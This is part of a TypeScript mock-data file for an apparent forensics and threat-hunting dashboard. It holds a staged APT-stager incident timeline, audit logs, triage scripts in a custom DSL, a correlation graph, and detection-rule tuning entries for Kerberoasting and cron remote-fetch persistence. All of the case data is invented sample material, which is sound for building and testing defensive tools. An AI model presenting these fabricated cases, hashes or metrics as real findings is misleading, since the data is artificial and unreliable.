    title: 'Suspicious Process Started: suspicious.exe',
    description: 'Process suspicious.exe (PID 4128) executed from Temp path under SYSTEM token.',
    category: 'process',
    severity: 'critical',
    user: 'NT AUTHORITY\\SYSTEM',
    details: { PID: '4128', Path: 'C:\\Windows\\Temp\\suspicious.exe', Status: 'Running' }
  },
  {
    id: 'TLE-06',
    timestamp: '2026-09-28 10:21:15',
    timeOnly: '10:21:15',
    title: 'Network Connection to C2 Relay Node',
    description: 'Established encrypted TLS session to 185.220.101.4:443.',
    category: 'network',
    severity: 'critical',
    user: 'NT AUTHORITY\\SYSTEM',
    details: { DestIP: '185.220.101.4', Port: '443', Protocol: 'TLS' }
  },
  {
    id: 'TLE-07',
    timestamp: '2026-09-28 10:21:19',
    timeOnly: '10:21:19',
    title: 'Security Log Event Generated',
    description: 'Process creation audited and Sysmon Network Connection recorded.',
    category: 'log',
    severity: 'critical',
    user: 'NT AUTHORITY\\SYSTEM',
    details: { EventID: '4688 / Sysmon 3', Channel: 'Security' }
  },
  {
    id: 'TLE-08',
    timestamp: '2026-09-28 10:21:32',
    timeOnly: '10:21:32',
    title: 'Suspicious Indicator: Anomaly Rule Triggered',
    description: 'JOCKY correlation engine flagged anomalous multi-stage chain matching APT stager behavior.',
    category: 'finding',
    severity: 'critical',
    details: { Rule: 'JOCKY-RULE-PROC-044', Confidence: '94%', Risk: 'Critical' }
  }
];

export const MOCK_REPORTS: ReportItem[] = [
  {
    id: 'RPT-2026-001',
    caseId: 'JCK-2026-001',
    title: 'Comprehensive Digital Forensics & Threat Hunting Report',
    created: '2026-09-28 11:00:00',
    investigator: 'Dr. Sarah Chen, CISSP / GCFE',
    format: 'PDF',
    status: 'ready',
    summary: 'Executive summary, technical artifact analysis, process lineage diagrams, network telemetry, and evidence verification chain.',
    pagesCount: 18,
    sizeMb: '4.8 MB',
    reportType: 'Investigation'
  },
  {
    id: 'RPT-2026-002',
    caseId: 'JCK-2026-001',
    title: 'Cryptographic Chain-of-Custody & Evidence Integrity Ledger',
    created: '2026-09-28 10:55:00',
    investigator: 'Dr. Sarah Chen, CISSP / GCFE',
    format: 'JSON',
    status: 'ready',
    summary: 'Machine-verifiable JSON audit log of all 32 evidence items with dual SHA-256/BLAKE3 hashes and acquisition timestamps.',
    pagesCount: 6,
    sizeMb: '1.2 MB',
    reportType: 'Evidence'
  },
  {
    id: 'RPT-2026-003',
    caseId: 'JCK-2026-001',
    title: 'Incident Timeline & Event Correlation Reconstruction',
    created: '2026-09-28 10:48:00',
    investigator: 'Dr. Sarah Chen, CISSP / GCFE',
    format: 'CSV',
    status: 'ready',
    summary: 'Microsecond chronological table of process creations, network sockets, file modifications, and security log entries.',
    pagesCount: 4,
    sizeMb: '840 KB',
    reportType: 'Timeline'
  },
  {
    id: 'RPT-2026-004',
    caseId: 'JCK-2026-002',
    title: 'Ubuntu Web Tier Cron Persistence & Socket Analysis',
    created: '2026-09-27 16:20:00',
    investigator: 'Marcus Vance, GCFA',
    format: 'PDF',
    status: 'ready',
    summary: 'Analysis of Linux cron jobs, auditd syscall records, and socket listeners across Ubuntu web worker hosts.',
    pagesCount: 12,
    sizeMb: '3.1 MB',
    reportType: 'System'
  }
];

export const MOCK_AUDIT_LOGS: AuditLog[] = [
  {
    id: 'AUD-001',
    timestamp: '2026-09-28 10:45:12',
    user: 'sarah.chen@forensics.corp',
    action: 'Report Generated',
    caseId: 'JCK-2026-001',
    object: 'RPT-2026-001 (PDF)',
    result: 'SUCCESS',
    details: 'Signed forensic report compiled with cryptographically sealed artifact digest',
    hash: '8f43a9b1c2d3e4f5061728394a5b6c7d'
  },
  {
    id: 'AUD-002',
    timestamp: '2026-09-28 10:40:05',
    user: 'sarah.chen@forensics.corp',
    action: 'Finding Reviewed',
    caseId: 'JCK-2026-001',
    object: 'FND-2026-02 (Obfuscated PowerShell)',
    result: 'VERIFIED',
    details: 'Status changed from under_review to confirmed malicious stager',
    hash: '1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d'
  },
  {
    id: 'AUD-003',
    timestamp: '2026-09-28 10:28:30',
    user: 'marcus.vance@forensics.corp',
    action: 'Script Validated',
    caseId: 'JCK-2026-001',
    object: 'investigation.jocky',
    result: 'SUCCESS',
    details: 'JOCKY DSL script passed semantic analysis and IR synthesis for Windows runtime',
    hash: 'e5f6a1b2c3d4e7f8091a2b3c4d5e6f7a'
  },
  {
    id: 'AUD-004',
    timestamp: '2026-09-28 10:25:12',
    user: 'SYSTEM (Agent Win-01)',
    action: 'Evidence Collected',
    caseId: 'JCK-2026-001',
    object: 'EVD-2026-001 (Process Memory Artifact)',
    result: 'VERIFIED',
    details: 'Live memory dump written with SHA-256 verification: 9f86d081884c7d65...',
    hash: '9f86d081884c7d659a2feaa0c55ad015'
  },
  {
    id: 'AUD-005',
    timestamp: '2026-09-28 10:21:40',
    user: 'SYSTEM (Agent Win-01)',
    action: 'Evidence Exported',
    caseId: 'JCK-2026-001',
    object: 'EVD-2026-003 (PCAP Stream)',
    result: 'SUCCESS',
    details: 'Packet capture stream securely transmitted to primary evidence vault over TLS 1.3',
    hash: '7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f'
  },
  {
    id: 'AUD-006',
    timestamp: '2026-09-28 09:14:22',
    user: 'sarah.chen@forensics.corp',
    action: 'Investigation Created',
    caseId: 'JCK-2026-001',
    object: 'Case JCK-2026-001',
    result: 'SUCCESS',
    details: 'Authorized digital forensics triage case initiated for host WIN-FORENSIC-01',
    hash: '0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d'
  }
];

export const MOCK_VALIDATION_SCENARIOS: ValidationScenario[] = [
  {
    id: 'VAL-001',
    name: 'Forensic Collection & Live Memory Acquisition Test',
    testEnvironment: 'Windows Sandbox',
    scenarioType: 'Live Memory & Process Telemetry',
    expectedResult: 'Process memory, active socket handles, and PE headers captured with zero crash or memory leak',
    observedResult: 'Complete memory acquisition finished in 184ms, zero process disruption observed',
    telemetry: 'JOCKY driver collected 142MB memory slice; SHA-256 match confirmed',
    status: 'PASSED',
    executionTimeMs: 184,
    timestamp: '2026-09-28 10:15:00',
    evidenceItemsCollected: 6
  },
  {
    id: 'VAL-002',
    name: 'Cross-Platform File System Walking & Hash Benchmark',
    testEnvironment: 'Ubuntu Test VM',
    scenarioType: 'File Integrity & Metadata Collection',
    expectedResult: 'Recursive directory traversal of 10,000 files in under 2 seconds with dual hash generation',
    observedResult: '10,000 items scanned and cataloged in 1,420ms without kernel panic or I/O bottleneck',
    telemetry: 'Traversed 10,412 inodes; 0 permission bypass attempts; strictly read-only execution',
    status: 'PASSED',
    executionTimeMs: 1420,
    timestamp: '2026-09-28 09:40:22',
    evidenceItemsCollected: 12
  },
  {
    id: 'VAL-003',
    name: 'Event Correlation Rule Latency & High-Load Stress Test',
    testEnvironment: 'Isolated Forensics Lab',
    scenarioType: 'Telemetry Evaluation & False Positive Filter',
    expectedResult: 'Process-to-network-to-log correlation latency < 50ms under 50,000 events/second',
    observedResult: 'Average latency measured at 32ms; false positive suppression rate 99.4%',
    telemetry: 'Synthesized 50,000 mock security events; all 4 injection anchors accurately identified',
    status: 'PASSED',
    executionTimeMs: 820,
    timestamp: '2026-09-28 08:30:10',
    evidenceItemsCollected: 4
  },
  {
    id: 'VAL-004',
    name: 'Controlled Anomaly Detection Sensitivity Calibration',
    testEnvironment: 'Windows Sandbox',
    scenarioType: 'Detection Resistance & Noise Immunity',
    expectedResult: 'Detect low-and-slow jittered egress beacons without generating noise on standard browser traffic',
    observedResult: 'Jittered beacon detected with 87% confidence; baseline web browsing classified clean',
    telemetry: 'Analyzed 1,200 socket events; zero legitimate session drops',
    status: 'PASSED',
    executionTimeMs: 412,
    timestamp: '2026-09-27 16:50:00',
    evidenceItemsCollected: 8
  }
];

export const MOCK_JOCKY_SCRIPTS: JockyScriptFile[] = [
  {
    id: 'SCR-001',
    name: 'investigation.jocky',
    description: 'Comprehensive forensic triage script inspecting host metadata, processes, sockets, and evidence export.',
    targetPlatform: 'cross_platform',
    code: `// JOCKY Forensic Domain-Specific Language
// Script: investigation.jocky
// Target: Cross-Platform (Windows & Linux)
// Purpose: Full triage and evidence acquisition

// 1. Collect Host Telemetry
system.info()
system.hostname()
system.users()
system.os()

// 2. Process Enumeration & Anomaly Hunting
process.list()
process.find("suspicious.exe")
process.find("powershell.exe")

// 3. Network Sockets & Active Connections
network.interfaces()
network.connections()
network.routes()

// 4. File Integrity & Targeted Path Inspection
file.search("*.dll", "C:/Windows/Temp")
file.search("*.exe", "C:/Windows/Temp")
file.hash("C:/Windows/Temp/suspicious.exe")

// 5. Centralized Event Logging
log.collect("Security")
log.collect("Auditd")

// 6. Evidence Preservation & Export
evidence.collect()
evidence.hash()
evidence.export("case-001")
`
  },
  {
    id: 'SCR-002',
    name: 'process.jocky',
    description: 'Process lineage analysis, memory inspection, and parent/child correlation.',
    targetPlatform: 'windows',
    code: `// JOCKY Script: process.jocky
// Focus: Process Forensics & Memory State

process.list()
process.details(4128)
process.lineage(4128)
process.find("powershell.exe")
process.memory_dump(4128, "C:/Users/Public/debug_dump.bin")
process.threads(4128)
process.handles(4128)

evidence.collect()
evidence.export("proc-artifacts-001")
`
  },
  {
    id: 'SCR-003',
    name: 'network.jocky',
    description: 'Network socket monitoring, external connection auditing, and DNS packet triage.',
    targetPlatform: 'cross_platform',
    code: `// JOCKY Script: network.jocky
// Focus: Network Forensics & Egress Analysis

network.interfaces()
network.connections()
network.routes()
network.filter_remote("185.220.101.4")
network.pcap_capture("eth0", 60)

evidence.collect()
evidence.export("net-artifacts-001")
`
  },
  {
    id: 'SCR-004',
    name: 'files.jocky',
    description: 'Targeted file search, SHA-256 hashing, entropy analysis, and timestamp audit.',
    targetPlatform: 'cross_platform',
    code: `// JOCKY Script: files.jocky
// Focus: File Forensics & Integrity Hashing

file.list("C:/Windows/Temp")
file.search("*.log")
file.metadata("C:/Windows/Temp/stager_drop.dll")
file.hash("C:/Windows/Temp/stager_drop.dll")
file.entropy("C:/Windows/Temp/stager_drop.dll")

evidence.collect()
evidence.export("file-evidence-001")
`
  },
  {
    id: 'SCR-005',
    name: 'evidence.jocky',
    description: 'Cryptographic chain-of-custody preservation and verifiable court-ready packaging.',
    targetPlatform: 'cross_platform',
    code: `// JOCKY Script: evidence.jocky
// Focus: Cryptographic Evidence Sealing

evidence.collect()
evidence.hash("SHA-256")
evidence.hash("BLAKE3")
evidence.verify_integrity()
evidence.chain_of_custody("JCK-2026-001")
evidence.export("JCK-2026-001-container")
`
  }
];

export const MOCK_CORRELATION_GRAPH: CorrelationGraphData = {
  nodes: [
    { id: 'node-proc-1', label: 'powershell.exe (PID 2840)', type: 'process', risk: 'high', details: 'Base64 encoded execution', subtext: 'Parent: cmd.exe' },
    { id: 'node-file-1', label: 'stager_drop.dll', type: 'file', risk: 'critical', details: 'Created in %TEMP% (Entropy 7.84)', subtext: 'Written by PID 2840' },
    { id: 'node-proc-2', label: 'suspicious.exe (PID 4128)', type: 'process', risk: 'critical', details: 'Spawned under SYSTEM token', subtext: 'Path: C:\\Windows\\Temp\\' },
    { id: 'node-net-1', label: '185.220.101.4:443 (TLS)', type: 'network', risk: 'critical', details: 'Tor Exit Relay Node', subtext: 'Socket opened by PID 4128' },
    { id: 'node-log-1', label: 'Event ID 4688 & Sysmon 3', type: 'log', risk: 'critical', details: 'Process & Socket Telemetry', subtext: 'Security Channel' },
    { id: 'node-fnd-1', label: 'APT Stager Finding #1', type: 'finding', risk: 'critical', details: '94% Confidence APT Stager', subtext: 'Rule JOCKY-RULE-PROC-044' }
  ],
  edges: [
    { from: 'node-proc-1', to: 'node-file-1', relationship: 'writes_file' },
    { from: 'node-file-1', to: 'node-proc-2', relationship: 'executes' },
    { from: 'node-proc-2', to: 'node-net-1', relationship: 'connects_outbound' },
    { from: 'node-net-1', to: 'node-log-1', relationship: 'generates_telemetry' },
    { from: 'node-proc-2', to: 'node-log-1', relationship: 'audited_by' },
    { from: 'node-log-1', to: 'node-fnd-1', relationship: 'triggers_finding' }
  ]
};

export const MOCK_CONTINUOUS_LEARNING: ContinuousLearningData = {
  detectionAccuracy: 98.6,
  falsePositiveRate: 1.4,
  ruleImprovementsCount: 42,
  updatedModulesCount: 16,
  feedbackHistory: [
    {
      id: 'FB-001',
      caseId: 'JCK-2026-001',
      ruleName: 'JOCKY-RULE-PROC-044 (Untrusted Temp Exec)',
      previousVerdict: 'Potentially Suspicious (85%)',
      updatedVerdict: 'Confirmed High Risk APT Stager (94%)',
      analyst: 'Dr. Sarah Chen',
      date: '2026-09-28 10:42',
      impact: 'Added Tor CIDR correlation heuristic'
    },
    {
      id: 'FB-002',
      caseId: 'JCK-2026-002',
      ruleName: 'JOCKY-RULE-CRON-008 (Cron Remote Fetch)',
      previousVerdict: 'False Positive Flag',
      updatedVerdict: 'Tuned: Exclude /etc/cron.daily/apt-compat',
      analyst: 'Marcus Vance',
      date: '2026-09-27 15:30',
      impact: 'Suppressed 14 false positive alerts across Ubuntu cluster'
    },
    {
      id: 'FB-003',
      caseId: 'JCK-2026-003',
      ruleName: 'JOCKY-RULE-KERB-091 (RC4 Ticket Anomaly)',
      previousVerdict: 'Medium Risk',
      updatedVerdict: 'Elevated to Critical Kerberoasting Signature',
      analyst: 'Elena Rostova',
      date: '2026-09-26 19:10',
      impact: 'Decreased detection threshold from 10 to 5 RC4 tickets/min'
    }
  ],
  moduleUpdates: [
    { module: 'jocky-lexer-core', version: 'v2.4.1', releaseDate: '2026-09-28', changes: 'Optimized token stream cache; added regex string literal tokenization' },
    { module: 'jocky-win-collector', version: 'v2.4.0', releaseDate: '2026-09-25', changes: 'Windows 11 23H2/24H2 kernel handle table walking support' },
    { module: 'jocky-linux-ebpf', version: 'v2.3.8', releaseDate: '2026-09-22', changes: 'eBPF kprobe tracing for sys_enter_execve on Linux 6.8+ kernels' },
    { module: 'jocky-evidence-vault', version: 'v2.4.0', releaseDate: '2026-09-20', changes: 'BLAKE3 dual hashing and tamper-evident merkle chain ledger' }
  ]
};

export const MOCK_DASHBOARD_SUMMARY: DashboardSummary = {
  activeInvestigations: 12,
  connectedSystems: 24,
  evidenceItems: 3482,
  findings: 37,
  networkEvents: 18420,
  criticalAlerts: 6,
  investigationActivity: [
    { date: '09/22', open: 8, resolved: 3, events: 8200 },
    { date: '09/23', open: 9, resolved: 5, events: 11400 },
    { date: '09/24', open: 11, resolved: 7, events: 13900 },
    { date: '09/25', open: 10, resolved: 6, events: 15200 },
    { date: '09/26', open: 14, resolved: 8, events: 16800 },
    { date: '09/27', open: 13, resolved: 9, events: 17600 },
    { date: '09/28', open: 12, resolved: 11, events: 18420 }
  ],
  findingsBySeverity: [
    { severity: 'Critical', count: 6, color: '#DC2626' },
    { severity: 'High', count: 14, color: '#EA580C' },
    { severity: 'Medium', count: 12, color: '#D97706' },
    { severity: 'Low', count: 5, color: '#2563EB' }
  ],
  evidenceDistribution: [
    { name: 'Processes', count: 1140, percentage: 33, color: '#2563EB' },
    { name: 'Files', count: 980, percentage: 28, color: '#059669' },
    { name: 'Network Sockets', count: 652, percentage: 19, color: '#7C3AED' },
    { name: 'System Logs', count: 480, percentage: 14, color: '#D97706' },
    { name: 'Host Metadata', count: 230, percentage: 6, color: '#0284C7' }
  ],
  platformDistribution: [
    { platform: 'Windows Systems', count: 15, percentage: 62.5 },
    { platform: 'Ubuntu/Linux Systems', count: 9, percentage: 37.5 }
  ],
  recentInvestigations: MOCK_INVESTIGATIONS.slice(0, 5)
};
